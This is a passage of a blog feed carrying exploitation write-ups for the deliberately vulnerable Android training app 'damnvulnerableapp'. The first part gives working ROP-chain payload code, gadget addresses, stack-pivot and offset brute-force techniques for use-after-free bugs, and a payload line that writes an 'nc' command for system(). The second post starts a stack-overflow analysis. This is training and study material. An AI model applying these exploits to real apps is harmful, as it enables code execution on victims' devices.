&lt;span style="color:#f92672">*&lt;/span>(obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>)(buffer, keyValue);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>because &lt;code>StringPrintf&lt;/code> silently assumes that &lt;code>rdi&lt;/code> is an address to a variable that has to store a result of &lt;code>24&lt;/code> bytes and &lt;code>rsi&lt;/code> is the format string. If we did not make the above change, then &lt;code>StringPrintf&lt;/code> would zero out the first &lt;code>24&lt;/code> bytes of our format string, thus completely shutting down the attack. Adding to the pile, we do not have any control over addresses that are accessible via direct parameter access. To be precise, we would need to be lucky enough to find any addresses of interest on the stack like e.g. the format string itself.&lt;/p>
&lt;p>Another idea could be to call &lt;code>dlopen&lt;/code> to get a reference to another library that provides more interesting functionality like &lt;code>system&lt;/code>! The offset of the &lt;code>.plt&lt;/code> - entry that calls &lt;code>dlopen&lt;/code> is &lt;code>0xa096b0&lt;/code>. Thus we can compute the overall virtual address. Unfortunately, this is shut down by the fact that &lt;code>dlopen&lt;/code> returns a random &lt;code>8&lt;/code> - byte value that is a key into a dictionary, whose values are the actual addresses of &lt;code>soinfo&lt;/code> - structures, which again contain the base addresses. So it is pretty unlikely to get this right, the best we could do here is either guessing or trying to leak the dictionary via a global variable.&lt;/p>
&lt;h3 id="finally-the-solution">Finally: the solution&lt;/h3>
&lt;p>Another approach is to try to exploit this UAF vulnerability via a ROP - chain. This is a very destructive approach, but lets see through this:&lt;/p>
&lt;ol>
&lt;li>Find a gadget that, right before the call of our &lt;code>obj + 0x100&lt;/code> function, modifies the stack in such a way that it will return to &lt;code>keyValue&lt;/code>.&lt;/li>
&lt;li>Put ROP - chain into &lt;code>keyValue&lt;/code>. We may use at most &lt;code>256 // 8 = 32&lt;/code> qwords. This might be sufficient to leak a &lt;code>libc.so&lt;/code> address into a global variable in &lt;code>libart.so&lt;/code>. It will turn out that this even suffices to get arbitrary, limited - length command execution.&lt;/li>
&lt;li>Finally restore the old &lt;code>rsp&lt;/code> and &lt;code>rbp&lt;/code>. This would be necessary for a stealthy approach. Restoring &lt;code>rsp&lt;/code> is only really important for calling &lt;code>system&lt;/code>, because if &lt;code>rsp&lt;/code> points into &lt;code>keyValue&lt;/code>, which is located on the heap, &lt;code>system&lt;/code> will allocate alot of memory from the heap as if it was a stack, therefore going out-of-bounds fast.&lt;/li>
&lt;/ol>
&lt;p>So, the gadget of choice is located at &lt;code>0x39509a&lt;/code> and is of the form:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ x/10i 0x730c03400000 + 0x39509a
0x730c0379509a &amp;lt;art_quick_do_long_jump+106&amp;gt;: pop rdi
0x730c0379509b &amp;lt;art_quick_do_long_jump+107&amp;gt;: pop rsi
0x730c0379509c &amp;lt;art_quick_do_long_jump+108&amp;gt;: pop rbp
0x730c0379509d &amp;lt;art_quick_do_long_jump+109&amp;gt;: add rsp,0x8
0x730c037950a1 &amp;lt;art_quick_do_long_jump+113&amp;gt;: pop rbx
0x730c037950a2 &amp;lt;art_quick_do_long_jump+114&amp;gt;: pop rdx
0x730c037950a3 &amp;lt;art_quick_do_long_jump+115&amp;gt;: pop rcx
0x730c037950a4 &amp;lt;art_quick_do_long_jump+116&amp;gt;: pop rax
0x730c037950a5 &amp;lt;art_quick_do_long_jump+117&amp;gt;: pop rsp
0x730c037950a6 &amp;lt;art_quick_do_long_jump+118&amp;gt;: ret
&lt;/code>&lt;/pre>&lt;p>We can use the debugger to figure out how many qwords we need to pop in order for the &lt;code>ret&lt;/code> - instruction to return to &lt;code>keyValue&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair
...
0x0000730b9d3c8b5c &amp;lt;+252&amp;gt;: mov rax,QWORD PTR [rbp-0x70]
0x0000730b9d3c8b60 &amp;lt;+256&amp;gt;: mov rax,QWORD PTR [rax+0x100]
0x0000730b9d3c8b67 &amp;lt;+263&amp;gt;: mov rdi,QWORD PTR [rbp-0x78] &amp;lt;--- keyValue
0x0000730b9d3c8b6b &amp;lt;+267&amp;gt;: xor ecx,ecx
0x0000730b9d3c8b6d &amp;lt;+269&amp;gt;: mov DWORD PTR [rbp-0xac],ecx
0x0000730b9d3c8b73 &amp;lt;+275&amp;gt;: mov esi,ecx
=&amp;gt; 0x0000730b9d3c8b75 &amp;lt;+277&amp;gt;: call rax &amp;lt;--- execution condition
...
gef➤ x/1gx $rbp-0x78
0x730b9afdf818: 0x0000730cb77bb950
gef➤ x/10gx $rsp
0x730b9afdf7e0: 0x00000000990de82b 0x0000730d778087d0
0x730b9afdf7f0: 0x0000730b9afdfb00 0x0000730d77808880
0x730b9afdf800: 0x0000730b9afdfd60 0x0000730ca77f2750
0x730b9afdf810: 0x000000d09afdf8b0 0x0000730cb77bb950 &amp;lt;--- this is keyValue
0x730b9afdf820: 0x0000730cb77bb950 0x0000730c0379509c
&lt;/code>&lt;/pre>&lt;p>So when we run into &lt;code>call rax&lt;/code>, we push an additional return address onto the stack. Therefore we need to pop &lt;code>1 + 7&lt;/code> qwords from the stack before we can shift the stack into &lt;code>keyValue&lt;/code> and hit &lt;code>ret&lt;/code>. So we need &lt;code>rsp&lt;/code> to be &lt;code>keyValue&lt;/code>, then the stack &amp;ldquo;changes&amp;rdquo; to our controlled ROP - chain. Therefore we can make use the &lt;em>Execute&lt;/em> condition to run the above gadget, which will then trigger execution of the gadgets located in &lt;code>keyValue&lt;/code>.&lt;/p>
&lt;p>Now we will try to leak a &lt;code>libc.so&lt;/code> address into a global variable in &lt;code>libart.so&lt;/code>. This allows us to compute the &lt;code>libc.so&lt;/code> base address, which in turn allows us to call &lt;code>system&lt;/code> (the holy grail)! To that end, we will try to find a &lt;code>libc.so&lt;/code> address in &lt;code>libart.so&lt;/code>. The &lt;code>.got.plt&lt;/code> is the best place to start looking. As Android&amp;rsquo;s dynamic linker likes loading shared objects with &lt;code>BIND_NOW&lt;/code> (which is probably motivated by &lt;em>RELRO&lt;/em>), the &lt;code>.got.plt&lt;/code> is already populated with the correct function addresses. This implies that the &lt;code>.got.plt&lt;/code> entry of &lt;code>_exit&lt;/code> contains the actual address of &lt;code>_exit&lt;/code> in the &lt;code>libc.so&lt;/code>. Computing the offset of &lt;code>_exit&lt;/code>&amp;rsquo;s &lt;code>.got.plt&lt;/code> entry yields &lt;code>0xc1be50&lt;/code> (we could use any other function from &lt;code>libc.so&lt;/code>; &lt;code>_exit&lt;/code> was chosen arbitrarily).&lt;/p>
&lt;p>Observe that we only need 6 qwords to leak &lt;code>system&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Leak exit@libc into rax&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> address_got_plt_exit
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_rax_deref_rdi
&lt;span style="color:#75715e"># Put system@libc into rax&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
payload &lt;span style="color:#f92672">+=&lt;/span> p64(offset__exit &lt;span style="color:#f92672">-&lt;/span> offset_system) &lt;span style="color:#75715e"># --&amp;gt; offset__exit &amp;gt;= offset_system (just testing)&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_sub_rax_rcx
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After the above, &lt;code>rax&lt;/code> will contain the address of &lt;code>system@libc&lt;/code>. Setting up the command to execute can be done by writing to a writable memory area in &lt;code>libart.so&lt;/code> (hope that this does not crash; otherwise choose another area until it works). Writing the command could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> address_writable_memory
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;nc 10.0.&amp;#39;&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rcx
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally, we want to call &lt;code>system@libc&lt;/code>, whose address is stored in &lt;code>rax&lt;/code>. The main problem here is that just calling &lt;code>system&lt;/code> will most likely crash the app, because &lt;code>rsp&lt;/code> still points into the heap. If &lt;code>system&lt;/code> uses a lot of stack memory, this will eventually invalidate heap chunks or trigger &lt;em>anti - out - of - bounds&lt;/em> security mechanisms. Therefore, we need to restore &lt;code>rsp&lt;/code> s.t. it points into a sufficiently large memory area that is assumed to be used by &amp;ldquo;user - code&amp;rdquo;, i.e. e.g. the original stack. Observe that the &lt;a href="#leaking-data">leaked addresses&lt;/a> contained a stack pointer. We can go ahead and write the address of &lt;code>system@libc&lt;/code> into that address and then restore the stack with a &lt;code>pop rsp; ret&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Write address of system@got.plt to stack address. rdi currently contains the command string!&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rcx_rax &lt;span style="color:#75715e"># &amp;lt;-- rax = system@libc&lt;/span>
&lt;span style="color:#75715e"># Restore stack. This gadget implicitly calls system&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rsp
payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This exploit is &lt;strong>very&lt;/strong> specific to this module, but it uses a technique that shifts the stack into a user - controlled memory region s.t. successive &lt;code>ret&lt;/code> - instructions result in execution of ROP - gadgets.&lt;/p>
&lt;h2 id="coming-back-from-useafterfreeexecmodule">Coming back from &lt;em>UseAfterFreeExecModule&lt;/em>&lt;/h2>
&lt;p>The technique used to exploit the UAF vulnerability in the &lt;em>UseAfterFreeExecModule&lt;/em> might be applicable to &lt;em>libUseAfterFreeWriteModule&lt;/em> aswell. General steps are:&lt;/p>
&lt;ol>
&lt;li>Setup a ROP - chain in readable/writeable memory area. In this case, this will be in a shared memory region somewhere is &lt;code>libart.so&lt;/code>.&lt;/li>
&lt;li>Next, overwrite &lt;code>rsp&lt;/code> to point to the above mentioned memory region. Then immediately return using &lt;code>ret&lt;/code>.&lt;/li>
&lt;li>Enjoy the ROP - chain&lt;/li>
&lt;/ol>
&lt;p>It turns out that this does not work by itself. As we can only write one qword in each function call, we can either overwrite the return address to trigger execution of e.g. a gadget or set the stack pointer, but &lt;strong>not&lt;/strong> both at once. Therefore, we need to do a little magic to make things work.&lt;/p>
&lt;p>The key observation is that &lt;code>rbp&lt;/code> is often used to restore &lt;code>rsp&lt;/code> in function epilogues. This is precisely what happens in the caller of &lt;code>storePair&lt;/code>! See the following assembly of &lt;code>storePair&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair
...
0x0000730b9ed59abd &amp;lt;+205&amp;gt;: mov rcx,QWORD PTR [rbp-0x50]
0x0000730b9ed59ac1 &amp;lt;+209&amp;gt;: mov rax,QWORD PTR [rbp-0x58]
0x0000730b9ed59ac5 &amp;lt;+213&amp;gt;: mov rax,QWORD PTR [rax]
0x0000730b9ed59ac8 &amp;lt;+216&amp;gt;: mov QWORD PTR [rax],rcx &amp;lt;--- write - what - where condition
0x0000730b9ed59acb &amp;lt;+219&amp;gt;: mov rdi,QWORD PTR [rbp-0x38]
0x0000730b9ed59acf &amp;lt;+223&amp;gt;: mov rax,QWORD PTR [rdi]
0x0000730b9ed59ad2 &amp;lt;+226&amp;gt;: mov rax,QWORD PTR [rax+0x600]
0x0000730b9ed59ad9 &amp;lt;+233&amp;gt;: mov rsi,QWORD PTR [rbp-0x48]
0x0000730b9ed59add &amp;lt;+237&amp;gt;: mov rdx,QWORD PTR [rbp-0x70]
0x0000730b9ed59ae1 &amp;lt;+241&amp;gt;: mov ecx,0x2
0x0000730b9ed59ae6 &amp;lt;+246&amp;gt;: call rax
0x0000730b9ed59ae8 &amp;lt;+248&amp;gt;: mov rdi,QWORD PTR [rbp-0x60]
0x0000730b9ed59aec &amp;lt;+252&amp;gt;: call 0x730b9ed59b90 &amp;lt;free@plt&amp;gt;
0x0000730b9ed59af1 &amp;lt;+257&amp;gt;: mov rax,QWORD PTR fs:0x28
0x0000730b9ed59afa &amp;lt;+266&amp;gt;: mov rcx,QWORD PTR [rbp-0x8]
0x0000730b9ed59afe &amp;lt;+270&amp;gt;: cmp rax,rcx
0x0000730b9ed59b01 &amp;lt;+273&amp;gt;: jne 0x730b9ed59b0d &amp;lt;Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair+285&amp;gt;
0x0000730b9ed59b07 &amp;lt;+279&amp;gt;: add rsp,0x70
0x0000730b9ed59b0b &amp;lt;+283&amp;gt;: pop rbp &amp;lt;--- restore old rbp of calling function
0x0000730b9ed59b0c &amp;lt;+284&amp;gt;: ret
&lt;/code>&lt;/pre>&lt;p>It is clear that in between the &lt;em>Write - What - Where&lt;/em> condition and the &lt;code>pop rbp&lt;/code> - instruction there are no references to the stored old &lt;code>rbp&lt;/code> of the calling function. Therefore, we can &amp;ldquo;safely&amp;rdquo; overwrite it. But why would we do this? Consider what happens after we return from &lt;code>storePair&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ x/35i 0x0000730c0379ffa9
0x730c0379ffa9: call r11
0x730c0379ffac: mov rdi,QWORD PTR gs:0xe0 &amp;lt;--- we return here
0x730c0379ffb5: mov rsi,rax
0x730c0379ffb8: movq rdx,xmm0
0x730c0379ffbd: call 0x730c03d62b00 &amp;lt;artInvokeInterfaceTrampolineWithAccessCheck+208&amp;gt;
0x730c0379ffc2: mov rcx,QWORD PTR gs:0xa0
0x730c0379ffcb: test rcx,rcx
0x730c0379ffce: jne 0x730c037a0034 &amp;lt;art_quick_read_barrier_mark_reg02+116&amp;gt;
0x730c0379ffd0: mov rsp,rbp &amp;lt;--- how convenient!
0x730c0379ffd3: movq xmm1,QWORD PTR [rsp+0x18]
0x730c0379ffd9: movq xmm2,QWORD PTR [rsp+0x20]
0x730c0379ffdf: movq xmm3,QWORD PTR [rsp+0x28]
0x730c0379ffe5: movq xmm4,QWORD PTR [rsp+0x30]
0x730c0379ffeb: movq xmm5,QWORD PTR [rsp+0x38]
0x730c0379fff1: movq xmm6,QWORD PTR [rsp+0x40]
0x730c0379fff7: movq xmm7,QWORD PTR [rsp+0x48]
0x730c0379fffd: movq xmm12,QWORD PTR [rsp+0x50]
0x730c037a0004: movq xmm13,QWORD PTR [rsp+0x58]
0x730c037a000b: movq xmm14,QWORD PTR [rsp+0x60]
0x730c037a0012: movq xmm15,QWORD PTR [rsp+0x68]
0x730c037a0019: add rsp,0x70
0x730c037a001d: pop rcx
0x730c037a001e: pop rdx
0x730c037a001f: pop rbx
0x730c037a0020: pop rbp
0x730c037a0021: pop rsi
0x730c037a0022: pop r8
0x730c037a0024: pop r9
0x730c037a0026: pop r12
0x730c037a0028: pop r13
0x730c037a002a: pop r14
0x730c037a002c: pop r15
0x730c037a002e: movq xmm0,rax
0x730c037a0033: ret
&lt;/code>&lt;/pre>&lt;p>So if we were to pass the function call &lt;code>call 0x730c03d62b00&lt;/code> and &lt;code>rcx = 0&lt;/code>, then we reach &lt;code>mov rsp, rbp&lt;/code>, where &lt;code>rbp&lt;/code> can be a value of our choice if we decide to overwrite the old rbp! After &lt;code>rsp&lt;/code> has been set, we can see that we have a lot of references to &lt;code>rsp&lt;/code> in order to restore the registers. So in addition to our ROP - chain, we need to ensure that there is a region of size &lt;code>0x70 + 11 * 0x8&lt;/code> of accessible memory. The content of the accessible memory region can be anything, although we could use it to make an initial setup for the registers. Right after that region, we can place our ROP - chain, as &lt;code>rsp&lt;/code> will point to &lt;code>rbp + 0x70 + 11 * 0x8 = rbp + 0xc8&lt;/code>. Once we hit the ROP - chain, we can continue as usual in order to set up a command for &lt;code>system&lt;/code> etc.&lt;/p>
&lt;p>Once we want to call &lt;code>system&lt;/code> we need to restore the stack in order to make segmentation faults etc. less likely (remember that &lt;code>rsp&lt;/code> is currently pointing to some globally accessible memory region, e.g. &lt;code>.bss&lt;/code>. We do &lt;strong>not&lt;/strong> want our stack to be there forever!). To that end we write the address of &lt;code>system&lt;/code> to the stack pointer that was leaked by &lt;code>lookupExamples&lt;/code>, set &lt;code>rsp&lt;/code> to that address and call &lt;code>pop rsp; ret&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Up to this point, rsp still points into .bss! This will most likely crash the app while calling system! Thus try to reset rsp by abusing the stack pointer leak. We will set rsp to the leaked address, but before we will set the stack value at that leaked address to system@libc! Thus we can use a pop rsp; ret gadget.&lt;/span>
&lt;span style="color:#75715e"># Write address of system@got.plt to stack address. rdi currently contains the command string!&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rcx_rax
&lt;span style="color:#75715e"># Restore stack&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rsp
payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
&lt;/code>&lt;/pre>&lt;/div>&lt;p>There is only one problem remaining, i.e. when monitoring the exploit with &lt;em>gdb&lt;/em>, we can observe that the ROP - chain might execute perfectly fine. But if we try to run the exploit without any debugger attached, it most likely does not work (at least in my case). There may be multiple reasons for that, among which the most probable ones are:&lt;/p>
&lt;ol>
&lt;li>&lt;em>gdb&lt;/em> shifts the stack, because it stores debug information or similar&lt;/li>
&lt;li>&lt;em>gdb&lt;/em> prevents the app from using certain global variables s.t. overwriting them with &lt;em>gdb&lt;/em> attached results in no error.&lt;/li>
&lt;/ol>
&lt;p>It turns out that the first hypothesis is most likely true! To that end, we can try to brute - force over a finite set of possible stack shifts like so:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">address_old_rbp &lt;span style="color:#f92672">=&lt;/span> p64(u64(leak[&lt;span style="color:#ae81ff">4&lt;/span>]) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x240&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (rbp_shift))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where&lt;/p>
&lt;ul>
&lt;li>&lt;code>leak[4]&lt;/code> is the stack address leak&lt;/li>
&lt;li>&lt;code>- 0x240&lt;/code> is the offset of the leaked stack address to the address of the old &lt;code>rbp&lt;/code> when &lt;em>gdb&lt;/em> is attached&lt;/li>
&lt;li>&lt;code>+ 0x8 * rbp_shift&lt;/code> shift to try for this run of the exploit. As we are &amp;ldquo;missing&amp;rdquo; &lt;em>gdb&lt;/em>, it is very probable that there is less data on the stack, thus we increment the stack address.&lt;/li>
&lt;/ul>
&lt;p>A big problem could be that both of the above reasons are true. Thus, minizing the ROP - chain we write into global memory can be very helpful to rule out the second reason as much as possible. E.g. we could use a ROP - chain that just calls &lt;code>sleep(42)&lt;/code>. Then brute - force over all shifts until the app blocks. The shift that caused a block (longer than usual execution times, i.e. it might not block for all &lt;code>42&lt;/code> seconds, because other threads might try to use overwritten global variables, which probably crashes the app!) is most likely the shift we were looking for.&lt;/p>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>It has been a long journey to get to &lt;em>arbitrary code execution&lt;/em>, but in the end it worked! We abused the fact that there are no bounds checks for &lt;code>rsp&lt;/code>, which allowed for redirecting the stack into attacker - controlled memory regions. This again triggered the execution of a ROP - chain.&lt;/p>
&lt;p>An upgrade to the above attack would be to use a single ROP - chain that triggers execution of &lt;code>mmap&lt;/code> and stores the result in a writable memory region. Then, using the &lt;em>Write - What - Where&lt;/em> condition, we could fill the new memory region with arbitrary shellcode. Finally, we can overwrite the return address to redirect control flow into the shellcode.&lt;/p></content></item><item><title>E²VA: Stack Buffer Overflow Module (Part 3)</title><link>https://lolcads.github.io/posts/2024/07/eva_2/</link><pubDate>Tue, 23 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/eva_2/</guid><description>Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.
Assumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .</description><content>&lt;h1 id="exploitation-of-easystackbufferoverflowmodule">Exploitation of &lt;em>EasyStackBufferOverflowModule&lt;/em>&lt;/h1>
&lt;p>This article describes exploitation of the &lt;em>EasyStackBufferOverflowModule&lt;/em>. During exploitation, various Android - specific caveats are discussed.&lt;/p>
&lt;h2 id="assumptions">Assumptions&lt;/h2>
&lt;p>We will assume that we have successfully grabbed a copy of the &lt;code>.apk&lt;/code> file of &lt;em>damnvulnerableapp&lt;/em>. Also, we will &lt;strong>not&lt;/strong> discuss how to unpack an &lt;code>.apk&lt;/code> file, but rather assume that we have access to &lt;code>libEasyStackBufferOverflowModule.so&lt;/code> and the &lt;code>EasyStackBufferOverflowModule&lt;/code> class. If it is unclear how to get access to these components when only given an &lt;code>.apk&lt;/code> file, read the previous blog posts first!&lt;/p>
&lt;h2 id="analysis-baseline">Analysis baseline&lt;/h2>
&lt;p>Lets first summarize what we have:&lt;/p>
&lt;ol>
&lt;li>Access to &lt;code>libEasyStackBufferOverflowModule.so&lt;/code>, which is a &lt;a href="http://www.sco.com/developers/gabi/latest/ch4.intro.html">shared - object file&lt;/a> that can be thrown into &lt;a href="https://ghidra-sre.org/">&lt;em>Ghidra&lt;/em>&lt;/a>.&lt;/li>
&lt;li>Access to &lt;code>.apk&lt;/code> file, which can be thrown into &lt;a href="https://github.com/skylot/jadx">&lt;em>jadx&lt;/em>&lt;/a>.&lt;/li>
&lt;/ol>
&lt;p>First of all, consider the native function as a black box and just decompile the Java code via &lt;em>jadx&lt;/em>. Then, the code for &lt;code>EasyStackBufferOverflowModule&lt;/code> should look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#f92672">package&lt;/span> com.damnvulnerableapp.vulnerable.modules&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> com.damnvulnerableapp.common.exceptions.VulnerableModuleOperationException&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> java.nio.ByteBuffer&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">EasyStackBufferOverflowModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">vulnerableToUpper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EasyStackBufferOverflowModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">EasyStackBufferOverflowModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> StackBufferOverflowModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleOperationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> message&lt;span style="color:#f92672">;&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Welcome to the latest version of the echo service &amp;gt;:)&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">do&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
message &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> unknown &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> upper &lt;span style="color:#f92672">=&lt;/span> vulnerableToUpper&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">,&lt;/span> unknown&lt;span style="color:#f92672">);&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>upper&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Exiting...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The above code shows that the module takes two distinct inputs per iteration:&lt;/p>
&lt;ol>
&lt;li>a message to be upper - cased&lt;/li>
&lt;li>an integer that is also part of upper - casing.&lt;/li>
&lt;/ol>
&lt;p>Both inputs are forwarded to a native function called &lt;code>vulnerableToUpper&lt;/code>. Finally, the upper - cased message will be sent back to us.&lt;/p>
&lt;p>From &lt;code>EasyStackBufferOverflowModule&lt;/code> we can infer that there has to be a function in &lt;code>libEasyStackBufferOverflowModule.so&lt;/code>, whose symbol name contains &lt;code>vulnerableToUpper&lt;/code>. This can be confirmed via&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libEasyStackBufferOverflowModule.so | grep vulnerableToUpper
6: 00000000000008f0 &lt;span style="color:#ae81ff">322&lt;/span> FUNC GLOBAL DEFAULT &lt;span style="color:#ae81ff">12&lt;/span> Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper
